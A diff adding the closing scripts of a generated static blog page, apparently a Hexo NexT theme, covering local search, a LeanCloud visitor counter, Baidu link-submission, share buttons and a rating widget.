+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("3zIUNafVjzYQz7AJMe457cT0-gzGzoHsz", "PzPKmCfoYOpSgHcoyql6etIG");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+
+  <script>
+    
+      pbOptions = {};
+      
+          pbOptions.iconStyle = "box";
+      
+          pbOptions.boxForm = "horizontal";
+      
+          pbOptions.position = "bottomCenter";
+      
+          pbOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-postbottom', pbOptions);
+    
+    
+      flOptions = {};
+      
+          flOptions.iconStyle = "box";
+      
+          flOptions.boxForm = "horizontal";
+      
+          flOptions.position = "middleRight";
+      
+          flOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-float', flOptions);
+    
+  </script>
+
+  
+  <script type="text/javascript">
+  wpac_init = window.wpac_init || [];
+  wpac_init.push({widget: 'Rating', id: 12981,
+    el: 'wpac-rating',
+    color: 'fc6423'
+  });
+  (function() {
+    if ('WIDGETPACK_LOADED' in window) return;
+    WIDGETPACK_LOADED = true;
+    var mc = document.createElement('script');
+    mc.type = 'text/javascript';
+    mc.async = true;
+    mc.src = '//embed.widgetpack.com/widget.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+  })();
+  </script>
+
+
+  
+  
+
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>
+
+
+</body>
+</html>
